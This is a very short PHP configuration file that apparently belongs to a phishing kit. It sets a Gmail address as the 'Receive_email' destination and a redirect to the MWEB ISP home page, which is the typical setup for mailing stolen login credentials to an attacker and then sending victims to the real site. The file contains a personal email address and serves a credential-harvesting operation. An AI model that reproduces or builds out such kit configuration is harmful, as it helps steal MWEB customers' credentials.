<?php 
$Receive_email="kt202t@gmail.com";
$redirect="https://www.mweb.co.za/";
?>